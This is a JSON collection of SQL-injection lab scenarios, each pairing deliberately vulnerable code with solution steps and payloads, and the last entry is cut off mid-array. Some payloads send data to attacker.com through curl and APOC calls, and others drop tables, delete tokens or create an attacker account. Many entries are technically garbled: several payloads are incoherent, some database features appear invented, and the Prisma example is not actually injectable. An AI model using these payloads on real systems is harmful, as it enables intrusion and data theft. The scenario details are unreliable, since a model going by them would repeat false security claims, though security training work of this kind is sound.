[
    {
      "Lab scenario": "SQL Injection in GraphQL Enum Type Resolution",
      "Lab Description": "A GraphQL API dynamically maps enum values to SQL queries without proper validation. Attackers can manipulate enum parameters in introspection queries to break out of the type system and execute arbitrary SQL commands.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Query GraphQL schema to identify enum types",
        "Craft malicious enum value containing SQL payload",
        "Bypass type validation using null bytes",
        "Execute system commands through enum resolution",
        "Exfiltrate schema metadata through error messages"
      ],
      "Vulnerability name": "GraphQL Enum Injection",
      "srcCode": "const resolvers = {\n  Query: {\n    products(filter: {status: ProductStatus}) {\n      return db.query(`SELECT * FROM products WHERE status='${filter.status}'`)\n    }\n  }\n}",
      "payloads": [
        "AVAILABLE' UNION SELECT * FROM users--",
        "DISCONTINUED' FROM (SELECT * FROM admin_credentials) x--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in JWT Key ID Header",
      "Lab Description": "A JWT verification system uses the key ID (kid) header to dynamically select database-stored keys. The kid parameter is concatenated directly into SQL queries, allowing injection through crafted token headers.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept JWT and decode header",
        "Modify kid to contain SQL payload",
        "Bypass signature verification",
        "Extract encryption keys from database",
        "Forge administrative tokens"
      ],
      "Vulnerability name": "JWT Key ID Injection",
      "srcCode": "function verifyJWT(token) {\n  const { header } = jwt.decode(token, { complete: true });\n  const key = db.query(`SELECT public_key FROM jwt_keys WHERE kid='${header.kid}'`);\n  return jwt.verify(token, key);\n}",
      "payloads": [
        "123' UNION SELECT 'malicious_key'--",
        "default' OR 1=1 LIMIT 1--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Redis Time Series Filter",
      "Lab Description": "A Redis time series module converts TS.RANGE filters to SQL for hybrid queries. The filter parameter concatenation allows breaking out of Redis syntax into underlying SQL execution context.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify Redis time series endpoints",
        "Craft malicious filter containing SQL payload",
        "Bypass Redis command validation",
        "Execute stacked queries through filter injection",
        "Exfiltrate data through timestamp manipulation"
      ],
      "Vulnerability name": "Redis-to-SQL Injection",
      "srcCode": "app.post('/metrics', (req, res) => {\n  redis.sendCommand(['TS.RANGE', 'temperatures', req.body.start, req.body.end, \n    'FILTER', `sensor_id=${req.body.sensor}`]);\n});",
      "payloads": [
        "1) AND (SELECT 1 FROM pg_sleep(5))--",
        "' OR (SELECT 1 FROM (SELECT version()) x)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Kafka Connect JDBC Sink",
      "Lab Description": "A Kafka Connect pipeline uses user-provided table names in JDBC sink configurations. The table name parameter is embedded directly into INSERT statements without sanitization, allowing injection through topic metadata.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify Kafka Connect REST API endpoints",
        "Modify sink configuration with malicious table name",
        "Trigger message processing",
        "Bypass schema validation checks",
        "Compromise the entire JDBC sink"
      ],
      "Vulnerability name": "Kafka Connect SQLi",
      "srcCode": "{\n  \"name\": \"jdbc-sink\",\n  \"config\": {\n    \"connector.class\": \"io.confluent.connect.jdbc.JdbcSinkConnector\",\n    \"insert.mode\": \"insert\",\n    \"table.name.format\": \"${userTable}\"\n  }\n}",
      "payloads": [
        "legit_table\"); DROP TABLE users--",
        "metrics (SELECT * FROM sensitive_data) x--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in PostgreSQL FDW Options",
      "Lab Description": "A multi-database system creates PostgreSQL foreign data wrappers with dynamic options. The option string concatenation allows injection during FDW server creation, compromising linked databases.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify FDW creation endpoints",
        "Inject through option parameters",
        "Bypass FDW syntax validation",
        "Execute commands on remote servers",
        "Pivot through database links"
      ],
      "Vulnerability name": "FDW Options Injection",
      "srcCode": "CREATE SERVER remote_db\nFOREIGN DATA WRAPPER postgres_fdw\nOPTIONS (\n  host '${req.body.host}',\n  dbname '${req.body.dbname}',\n  port '${req.body.port}'\n);",
      "payloads": [
        "host='attacker.com', dbname='test', port='5432')) RETURNS TABLE(cmd text) AS $$ BEGIN RETURN QUERY EXECUTE 'COPY (SELECT * FROM passwords) TO PROGRAM ''curl attacker.com'''; END; $$ LANGUAGE plpgsql--",
        "host='legit.db', dbname='test', port='5432' options='connect_timeout=30'"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Snowflake External Function",
      "Lab Description": "A Snowflake data pipeline calls external functions with unsanitized parameters. The function arguments are concatenated directly into SQL queries, allowing injection through API gateway requests.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify external function calls",
        "Craft malicious argument containing SQL payload",
        "Bypass Snowflake parameter validation",
        "Execute commands in Snowflake context",
        "Exfiltrate data through function returns"
      ],
      "Vulnerability name": "Snowflake External Function Injection",
      "srcCode": "CREATE EXTERNAL FUNCTION process_data(arg STRING)\nRETURNS STRING\nAPI_INTEGRATION = api_integration\nAS 'https://api.example.com/process?param=${arg}'",
      "payloads": [
        "1' UNION SELECT * FROM information_schema.tables--",
        "legit' FROM (SELECT system$whitelist()) x--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver",
      "Lab Description": "An application uses Elasticsearch's SQL ODBC driver with user-provided query parameters. The parameter concatenation in the ODBC layer allows injection that bypasses Elasticsearch's normal security controls.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify Elasticsearch SQL ODBC connections",
        "Inject through query parameters",
        "Bypass Elasticsearch query DSL validation",
        "Access restricted indices",
        "Exfiltrate data through driver errors"
      ],
      "Vulnerability name": "Elasticsearch ODBC Injection",
      "srcCode": "SQLExecDirect(hstmt, \n  \"SELECT * FROM index WHERE field = '\" + userInput + \"'\", \n  SQL_NTS);",
      "payloads": [
        "1' OR '1'='1' LIMIT 100--",
        "test' FROM (SELECT * FROM sensitive_index) x--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in MongoDB Change Stream",
      "Lab Description": "A change stream listener converts MongoDB change events to SQL inserts. The document field paths are concatenated directly into SQL without sanitization, allowing injection through crafted collection updates.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify collections with change streams",
        "Update documents with malicious field paths",
        "Trigger change stream processing",
        "Bypass document validation",
        "Execute arbitrary SQL through field names"
      ],
      "Vulnerability name": "Change Stream SQL Injection",
      "srcCode": "collection.watch().on('change', (change) => {\n  const query = `INSERT INTO audit_log VALUES('${change.documentKey._id}', \n    '${change.fullDocument.field}')`;\n  db.query(query);\n});",
      "payloads": [
        "{field: \"1' FROM (SELECT * FROM secrets) x--\"}",
        "{_id: 1, '\"); DROP TABLE audit_logs--': 'value'}"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Neo4j Cypher to SQL Translation",
      "Lab Description": "A graph analytics platform converts Cypher queries to SQL for relational storage. The node property filters are concatenated directly into SQL, allowing injection through crafted MATCH clauses.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify Cypher to SQL translation endpoints",
        "Craft malicious node property filter",
        "Bypass Cypher parser validation",
        "Execute arbitrary SQL through property values",
        "Exfiltrate graph data through SQL injection"
      ],
      "Vulnerability name": "Cypher-to-SQL Injection",
      "srcCode": "MATCH (n:User {name: '${userInput}'})\nRETURN n",
      "payloads": [
        "admin'})-[r]->(m) RETURN m UNION SELECT * FROM sql_users--",
        "test' OR 1=1 WITH n CALL apoc.load.jsonParams('http://attacker.com/?exfil=' + n.password, {}) YIELD value--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in InfluxDB Flux Query",
      "Lab Description": "A monitoring system converts InfluxDB Flux queries to SQL for long-term storage. The Flux filter expressions are concatenated directly into SQL, allowing injection through crafted predicate functions.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify Flux to SQL conversion endpoints",
        "Inject through filter() function parameters",
        "Bypass Flux syntax validation",
        "Execute arbitrary SQL through range queries",
        "Exfiltrate metrics through injection"
      ],
      "Vulnerability name": "Flux-to-SQL Injection",
      "srcCode": "from(bucket: \"metrics\")\n  |> filter(fn: (r) => r._field == \"${userField}\")\n  |> toSQL()",
      "payloads": [
        "value' OR r._measurement == 'secret_metrics'--",
        "cpu' FROM (SELECT * FROM sql_metrics) x--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregate",
      "Lab Description": "A time-series platform creates TimescaleDB continuous aggregates with user-provided refresh policies. The policy parameters are concatenated directly into internal queries, allowing injection during materialization.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify continuous aggregate definitions",
        "Inject through refresh policy parameters",
        "Trigger materialization jobs",
        "Bypass time bucket validation",
        "Compromise hypertable data"
      ],
      "Vulnerability name": "Continuous Aggregate Injection",
      "srcCode": "CREATE MATERIALIZED VIEW metrics_agg\nWITH (timescaledb.continuous) AS\nSELECT time_bucket('${userInterval}', time) as bucket,\n  avg(value)\nFROM metrics\nGROUP BY bucket\nWITH NO DATA;",
      "payloads": [
        "1 hour') FROM (SELECT * FROM private_metrics) x--",
        "1 day'::interval) RETURNING *--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in CockroachDB CDC Webhook",
      "Lab Description": "A CockroachDB changefeed sends data to a webhook with SQL-defined filters. The filter expressions are concatenated directly into CDC queries, allowing injection through crafted webhook configurations.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify changefeed creation endpoints",
        "Inject through WITH filter parameter",
        "Trigger changefeed events",
        "Bypass CDC validation",
        "Exfiltrate data through webhook payloads"
      ],
      "Vulnerability name": "CDC Webhook Injection",
      "srcCode": "CREATE CHANGEFEED FOR TABLE users\nINTO 'webhook-https://callback.example.com'\nWITH filter = '${userFilter}';",
      "payloads": [
        "SELECT * FROM users WHERE type = 'admin'--",
        "SELECT *, (SELECT version()) FROM users--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in SQLite FTS5 Extension",
      "Lab Description": "A mobile app uses SQLite's FTS5 extension with user-provided match expressions. The match parameters are concatenated directly into virtual table queries, allowing injection through crafted search terms.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify FTS5 search endpoints",
        "Craft malicious match expression",
        "Bypass tokenizer validation",
        "Execute arbitrary SQL through match syntax",
        "Exfiltrate data through search results"
      ],
      "Vulnerability name": "FTS5 Match Injection",
      "srcCode": "SELECT * FROM docs\nWHERE docs MATCH '${userQuery}';",
      "payloads": [
        "\" OR docid IN (SELECT rowid FROM secrets)--",
        "content:test' AND (SELECT 1 FROM sqlite_master) OR '1'='1"
      ]
    },
    {
      "Lab scenario": "SQL Injection in DuckDB External File Import",
      "Lab Description": "A data analysis tool uses DuckDB's file import functionality with user-provided file names. The file path concatenation allows breaking out of import context to execute arbitrary SQL during file scanning.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify file import endpoints",
        "Craft malicious file path with SQL payload",
        "Trigger file scanning process",
        "Bypass file extension validation",
        "Exfiltrate data through import errors"
      ],
      "Vulnerability name": "DuckDB File Import Injection",
      "srcCode": "COPY (SELECT * FROM read_csv('${userFilePath}'))\nTO 'output.parquet';",
      "payloads": [
        "legit.csv') FROM (SELECT * FROM sensitive_data) x--",
        "/tmp/test.csv' WITH (HEADER true)) RETURNING *--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Materialized View Refresh Priority",
      "Lab Description": "A data warehouse allows setting refresh priorities for materialized views. The priority parameter is concatenated directly into internal refresh queries, allowing injection during view maintenance operations.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify materialized view priority settings",
        "Inject through priority parameter",
        "Trigger high-priority refresh",
        "Bypass view dependency checks",
        "Execute commands during refresh"
      ],
      "Vulnerability name": "MV Refresh Priority Injection",
      "srcCode": "ALTER MATERIALIZED VIEW user_stats\nSET REFRESH PRIORITY ${userPriority};",
      "payloads": [
        "100 FROM (SELECT * FROM admin_users) x--",
        "50); COPY (SELECT * FROM secrets) TO '/tmp/leak'--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in SQL Server PolyBase External Table",
      "Lab Description": "A SQL Server instance creates PolyBase external tables with user-provided location parameters. The location string concatenation allows injection during external data source configuration.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify external table creation endpoints",
        "Inject through location parameter",
        "Bypass PolyBase validation",
        "Execute commands on linked servers",
        "Exfiltrate data through external tables"
      ],
      "Vulnerability name": "PolyBase External Table Injection",
      "srcCode": "CREATE EXTERNAL TABLE ext_data (\n  id INT,\n  data VARCHAR(100)\n)\nWITH (\n  LOCATION = '${userLocation}',\n  DATA_SOURCE = external_source\n);",
      "payloads": [
        "/data/files') FROM (SELECT * FROM sys.sql_logins) x--",
        "C:\\import\\data.csv'); CREATE USER attacker WITH PASSWORD 'hack'--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in BigQuery Remote Function",
      "Lab Description": "A BigQuery implementation calls remote functions with unsanitized parameters. The function arguments are concatenated directly into SQL queries, allowing injection through HTTP endpoint responses.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify remote function calls",
        "Craft malicious response containing SQL payload",
        "Bypass BigQuery parameter validation",
        "Execute commands in BigQuery context",
        "Exfiltrate data through function returns"
      ],
      "Vulnerability name": "BigQuery Remote Function Injection",
      "srcCode": "CREATE FUNCTION remote_process(arg STRING)\nRETURNS STRING\nREMOTE WITH CONNECTION remote_conn\nOPTIONS (endpoint = 'https://api.example.com/process?param=${arg}');",
      "payloads": [
        "1' UNION SELECT dataset_id FROM region-us.INFORMATION_SCHEMA.SCHEMATA--",
        "legit' FROM (SELECT * FROM EXTERNAL_QUERY('connection', 'SELECT 1'))--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Snowflake External Stage",
      "Lab Description": "A Snowflake pipeline creates external stages with user-provided credentials. The credential string concatenation allows injection during stage creation, compromising cloud storage integrations.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify external stage creation endpoints",
        "Inject through credential parameters",
        "Bypass stage validation",
        "Execute commands in cloud provider context",
        "Exfiltrate data through stage operations"
      ],
      "Vulnerability name": "Snowflake Stage Injection",
      "srcCode": "CREATE STAGE my_stage\nURL = 's3://bucket/path/'\nCREDENTIALS = (AWS_KEY_ID = '${userKey}' AWS_SECRET_KEY = '${userSecret}');",
      "payloads": [
        "AKIA123...' FROM (SELECT * FROM information_schema.tables)--",
        "legit_key', AWS_SECRET_KEY = 'secret')) COPY INTO @my_stage FROM (SELECT * FROM sensitive_data)--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Databricks Notebook Parameter",
      "Lab Description": "A Databricks notebook executes SQL queries with widget parameters. The parameter values are concatenated directly into queries without sanitization, allowing injection through notebook execution.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify notebook widgets accepting SQL parameters",
        "Inject through widget values",
        "Bypass notebook parameter validation",
        "Execute commands in Databricks context",
        "Exfiltrate data through query results"
      ],
      "Vulnerability name": "Databricks Widget Injection",
      "srcCode": "dbutils.widgets.text(\"input\", \"default\")\nval query = s\"SELECT * FROM table WHERE field = '${dbutils.widgets.get(\"input\")}'\"\nspark.sql(query)",
      "payloads": [
        "1' UNION SELECT * FROM hive_metastore.default.secrets--",
        "test' FROM (SELECT explode(array(1,2,3)))--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Trino Catalog Configuration",
      "Lab Description": "A Trino cluster creates catalog configurations with user-provided properties. The property values are concatenated directly into internal queries, allowing injection during catalog initialization.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify catalog creation endpoints",
        "Inject through connector properties",
        "Trigger catalog refresh",
        "Bypass Trino security checks",
        "Compromise multiple data sources"
      ],
      "Vulnerability name": "Trino Catalog Injection",
      "srcCode": "CREATE CATALOG my_catalog\nWITH (\n  connector.name = 'postgresql',\n  connection-url = 'jdbc:postgresql://${userHost}:5432/${userDb}',\n  connection-user = '${userUser}',\n  connection-password = '${userPass}'\n);",
      "payloads": [
        "localhost/legit?ssl=true&user=postgres')) FROM (SELECT * FROM system.metadata.catalogs)--",
        "attacker.com/test?user=postgres&password=hack' FROM (SELECT 1) x) OR 1=1--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Presto Session Property",
      "Lab Description": "A Presto cluster accepts session properties that modify query execution. The property values are concatenated directly into system queries, allowing injection through client session settings.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify session property endpoints",
        "Inject through property values",
        "Bypass property validation",
        "Modify query execution plans",
        "Exfiltrate data through session changes"
      ],
      "Vulnerability name": "Presto Session Injection",
      "srcCode": "SET SESSION optimize_hash_generation = '${userValue}';",
      "payloads": [
        "true' FROM (SELECT * FROM system.metadata.tables)--",
        "false'); INSERT INTO system.runtime.queries VALUES ('malicious')--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in ClickHouse External Dictionary",
      "Lab Description": "A ClickHouse cluster configures external dictionaries with user-provided source parameters. The configuration values are concatenated directly into dictionary queries, allowing injection during dictionary loading.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify external dictionary definitions",
        "Inject through source configuration",
        "Trigger dictionary reload",
        "Bypass ClickHouse validation",
        "Compromise dictionary data"
      ],
      "Vulnerability name": "ClickHouse Dictionary Injection",
      "srcCode": "CREATE DICTIONARY my_dict (\n  source = POSTGRESQL(\n    host '${userHost}',\n    port 5432,\n    user '${userUser}',\n    password '${userPass}',\n    db '${userDb}',\n    query 'SELECT id, value FROM source_table'\n  )\n);",
      "payloads": [
        "localhost', user 'postgres', password 'hack')) FROM system.dictionaries--",
        "attacker.com', db 'legit', query 'SELECT 1')) COPY TABLE secrets TO '/tmp/leak'--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Druid SQL Query Context",
      "Lab Description": "A Druid cluster processes SQL queries with user-provided context parameters. The context values are concatenated directly into native Druid queries, allowing injection through query context settings.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify query context parameters",
        "Inject through context values",
        "Bypass Druid SQL validation",
        "Execute native Druid queries",
        "Exfiltrate data through context manipulation"
      ],
      "Vulnerability name": "Druid Context Injection",
      "srcCode": "{\n  \"query\": \"SELECT * FROM datasource\",\n  \"context\": {\n    \"${paramName}\": \"${paramValue}\"\n  }\n}",
      "payloads": [
        "\"sqlTimeZone\": \"UTC' FROM (SELECT * FROM sys.segments) x--\"",
        "\"maxScatterGatherBytes\": \"1000000\"}, {\"malicious\": \"' UNION SELECT * FROM sys.servers--\""
      ]
    },
    {
      "Lab scenario": "SQL Injection in Hive Metastore Partition Filter",
      "Lab Description": "A Hive metastore processes partition filters with user-provided expressions. The filter values are concatenated directly into metastore queries, allowing injection through partition pruning operations.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify partition filter endpoints",
        "Inject through filter expressions",
        "Bypass Hive validation",
        "Access unauthorized partitions",
        "Exfiltrate metadata through filter injection"
      ],
      "Vulnerability name": "Hive Metastore Injection",
      "srcCode": "SHOW PARTITIONS table PARTITION(${userFilter});",
      "payloads": [
        "dt='2023-01-01') FROM (SELECT * FROM PARTITIONS) x--",
        "category='books' OR (SELECT 1 FROM TBLS) IS NOT NULL--"
      ]
    },
    {
      "Lab scenario": "SQL Injection in Impala Admission Control",
      "Lab Description": "An Impala cluster processes admission control rules with user-provided conditions. The condition expressions are concatenated directly into policy queries, allowing injection through resource allocation rules.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify admission control endpoints",
        "Inject through rule conditions",
        "Bypass Impala validation",
        "Modify query prioritization",
        "Exfiltrate data through resource metrics"
      ],
      "Vulnerability name": "Impala Admission Control Injection",
      "srcCode": "CREATE POOL my_pool\nWITH ALLOCATION = 0.5\nWITH QUERY_CONDITION = '${userCondition}';",
      "payloads": [
        "user = 'admin' FROM (SELECT * FROM functional.alltypes) x--",
        "memory > 1000) RETURNING *--"
      ]
    },
    {
        "Lab scenario": "SQL Injection in Apache Superset Dashboard Filters",
        "Lab Description": "A Superset dashboard allows users to save custom filter values that get embedded directly into Jinja-templated SQL queries. The filter value processing fails to properly escape special characters, allowing injection through saved dashboard state.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Create a dashboard with custom filter",
          "Save filter value containing SQL payload",
          "Share dashboard to trigger query execution",
          "Bypass Jinja template sandbox",
          "Exfiltrate data through filter values"
        ],
        "Vulnerability name": "Superset Filter Injection",
        "srcCode": "SELECT * FROM table WHERE column = '{{ filter_values('saved_filter')[0] }}'",
        "payloads": [
          "' UNION SELECT username, password FROM superset_users--",
          "' || (SELECT table_name FROM information_schema.tables)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in SQLAlchemy Hybrid Properties",
        "Lab Description": "A Flask application uses SQLAlchemy's hybrid_property decorator with unsanitized string formatting. The property expressions get compiled directly into SQL queries, allowing injection through Python attribute access.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify hybrid property methods",
          "Access properties with malicious values",
          "Trigger SQL compilation",
          "Bypass SQLAlchemy parameterization",
          "Execute commands through property access"
        ],
        "Vulnerability name": "SQLAlchemy Hybrid Injection",
        "srcCode": "@hybrid_property\ndef search_query(self):\n    return f\"{self.field} LIKE '%{self.term}%'\"",
        "payloads": [
          "term=' OR 1=1--",
          "field=id) FROM (SELECT * FROM users) x--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Prisma Raw Query Middleware",
        "Lab Description": "A Next.js application uses Prisma's $queryRaw with unsanitized template literals. The middleware passes raw strings directly to the database driver, allowing injection through GraphQL resolver arguments.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify Prisma raw query endpoints",
          "Inject through GraphQL arguments",
          "Bypass Prisma parameter validation",
          "Execute stacked queries",
          "Exfiltrate schema through errors"
        ],
        "Vulnerability name": "Prisma Raw Query Injection",
        "srcCode": "const users = await prisma.$queryRaw`SELECT * FROM User WHERE email = ${email}`",
        "payloads": [
          "admin@example.com' OR 1=1--",
          "test@test.com' UNION SELECT * FROM Account--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Hasura Event Trigger Headers",
        "Lab Description": "A Hasura GraphQL engine processes event trigger webhook headers with unsanitized SQL interpolation. The header values get embedded directly into trigger processing queries, allowing injection through crafted HTTP headers.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify Hasura event triggers",
          "Modify webhook request headers",
          "Trigger event processing",
          "Bypass header validation",
          "Compromise the entire GraphQL schema"
        ],
        "Vulnerability name": "Hasura Header Injection",
        "srcCode": "INSERT INTO audit_logs (user_id, action)\nVALUES ('{{headers.user-id}}', '{{headers.action}}')",
        "payloads": [
          "' FROM (SELECT * FROM auth.users) x--",
          "1'); DELETE FROM auth.refresh_tokens--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in DBT Model Configs",
        "Lab Description": "A data transformation pipeline uses user-provided values in dbt model configurations. The config values get interpolated directly into compiled SQL models, allowing injection during dbt runs.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify dbt model configs",
          "Inject through var() references",
          "Trigger dbt compilation",
          "Bypass Jinja templating safeguards",
          "Modify production data models"
        ],
        "Vulnerability name": "DBT Config Injection",
        "srcCode": "SELECT * FROM {{ ref('users') }} \nWHERE department = '{{ var('user_dept') }}'",
        "payloads": [
          "' UNION SELECT * FROM sensitive.schema_versions--",
          "finance' FROM (SELECT * FROM information_schema.tables)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Dagster Asset Materialization",
        "Lab Description": "A Dagster pipeline materializes assets with user-provided metadata. The metadata values get embedded directly into SQL queries during asset recording, allowing injection through op outputs.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify asset materialization ops",
          "Inject through metadata fields",
          "Trigger pipeline execution",
          "Bypass type validation",
          "Compromise the asset catalog"
        ],
        "Vulnerability name": "Dagster Asset Injection",
        "srcCode": "@op\ndef process_data(context, data):\n    yield Materialization(\n        asset_key='user_data',\n        metadata={'size': len(data), 'sql_filter': f'user_id = {context.user}'}\n    )",
        "payloads": [
          "1 UNION SELECT * FROM dagster.runs--",
          "admin' FROM (SELECT * FROM dagster.assets)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Airflow Connection URI",
        "Lab Description": "An Airflow DAG creates database connections with user-provided URIs. The URI parameters get concatenated directly into connection strings, allowing injection during connection pooling.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify connection creation tasks",
          "Inject through URI parameters",
          "Trigger DAG execution",
          "Bypass URI parsing validation",
          "Compromise all database connections"
        ],
        "Vulnerability name": "Airflow URI Injection",
        "srcCode": "PostgresHook(\n    postgres_conn_id='user_db',\n    conn_str=f'postgresql://{user}:{password}@{host}:5432/{dbname}'\n)",
        "payloads": [
          "localhost/test?user=postgres')) FROM (SELECT * FROM information_schema.tables)--",
          "attacker.com/db?user=hacker&password=pwn') RETURNING *--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Metabase Dashboard Subscriptions",
        "Lab Description": "A Metabase instance processes dashboard subscription parameters with unsanitized SQL interpolation. The subscription values get embedded directly into scheduled queries, allowing injection through email alert parameters.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Create dashboard subscription",
          "Inject through filter parameters",
          "Wait for scheduled execution",
          "Bypass Metabase sandboxing",
          "Exfiltrate data through email content"
        ],
        "Vulnerability name": "Metabase Subscription Injection",
        "srcCode": "SELECT * FROM table \nWHERE {{#filter}}column = '{{.}}'{{/filter}}",
        "payloads": [
          "' UNION SELECT email, password FROM core_user--",
          "1' FROM (SELECT * FROM report_dashboard)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Retool DB Connection Strings",
        "Lab Description": "A Retool application creates database resources with user-provided connection strings. The connection parameters get concatenated directly into JDBC URLs, allowing injection during resource initialization.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify DB resource creation points",
          "Inject through connection parameters",
          "Trigger resource testing",
          "Bypass Retool validation",
          "Compromise all connected databases"
        ],
        "Vulnerability name": "Retool Connection Injection",
        "srcCode": "const db = new PostgresqlResource({\n  name: 'user_db',\n  connectionString: `postgresql://${username}:${password}@${host}:5432/${database}`\n})",
        "payloads": [
          "localhost/test?user=admin')) FROM (SELECT * FROM pg_user)--",
          "attacker.com/db?ssl=true&user=hacker') RETURNING *--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Cube.js Pre-Aggregation SQL",
        "Lab Description": "A Cube.js deployment allows user-provided SQL snippets in pre-aggregation definitions. The SQL gets embedded directly into materialization queries, allowing injection through cube schema definitions.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify cube pre-aggregations",
          "Inject through SQL snippets",
          "Trigger pre-aggregation refresh",
          "Bypass Cube.js validation",
          "Compromise the entire OLAP schema"
        ],
        "Vulnerability name": "Cube.js Pre-Agg Injection",
        "srcCode": "preAggregations: {\n  main: {\n    sql: `SELECT * FROM ${CUBE} WHERE ${securityContext.filter}`\n  }\n}",
        "payloads": [
          "1=1) UNION SELECT * FROM cubes--",
          "user_id = 1 FROM (SELECT * FROM cubes.schema)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Snowflake External Function Headers",
        "Lab Description": "A Snowflake external function passes HTTP headers directly into SQL queries during result processing. The header values get concatenated without sanitization, allowing injection through API gateway requests.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify external function calls",
          "Modify request headers",
          "Trigger function execution",
          "Bypass Snowflake parameterization",
          "Exfiltrate data through function results"
        ],
        "Vulnerability name": "Snowflake Header Injection",
        "srcCode": "CREATE EXTERNAL FUNCTION process_data(data STRING)\nRETURNS STRING\nHEADERS = {'user-id': '${context.user}'}\nAPI_INTEGRATION = api_int\nAS 'https://api.example.com/process'",
        "payloads": [
          "' FROM (SELECT * FROM information_schema.tables)--",
          "1'); SELECT system$whitelist()--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Looker Liquid Parameters",
        "Lab Description": "A Looker dashboard uses Liquid templating with user-provided parameters in SQL queries. The parameter interpolation fails to properly escape special characters, allowing injection through dashboard filters.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify Liquid parameter endpoints",
          "Inject through filter values",
          "Bypass Looker sandboxing",
          "Execute arbitrary SQL",
          "Exfiltrate data through visualization results"
        ],
        "Vulnerability name": "Looker Liquid Injection",
        "srcCode": "SELECT * FROM table \nWHERE {% condition filter_name %} column = '{{ filter_value }}' {% endcondition %}",
        "payloads": [
          "' UNION SELECT * FROM looker_connections--",
          "1' FROM (SELECT * FROM looker_users)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Tableau Hyper Extract Creation",
        "Lab Description": "A Tableau Server creates Hyper extracts with user-provided SQL queries. The query parameters get concatenated directly into extract generation jobs, allowing injection through published data source configurations.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify extract creation endpoints",
          "Inject through query parameters",
          "Trigger extract refresh",
          "Bypass Tableau validation",
          "Compromise the entire Tableau catalog"
        ],
        "Vulnerability name": "Tableau Hyper Injection",
        "srcCode": "CREATE EXTRACT '${extract_path}'\nAS SELECT * FROM ${data_source}\nWHERE ${user_filter}",
        "payloads": [
          "1=1) UNION SELECT * FROM _extracts--",
          "id = 1 FROM (SELECT * FROM _users)--"
        ]
      },
      {
        "Lab scenario": "SQL Injection in Power BI DirectQuery Parameters",
        "Lab Description": "A Power BI report uses DirectQuery with user-provided parameter values. The parameters get embedded directly into source queries, allowing injection through report filters.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify DirectQuery parameters",
          "Inject through report filters",
          "Bypass Power BI parameterization",
          "Execute commands on source database",
          "Exfiltrate data through visual results"
        ],
        "Vulnerability name": "Power BI DirectQuery Injection",
        "srcCode": "let\n  Source = Sql.Database(\"server\", \"db\"),\n  Data = Value.NativeQuery(Source, \"SELECT * FROM table WHERE col = '\" & parameter & \"'\")\nin\n  Data",
        "payloads": [
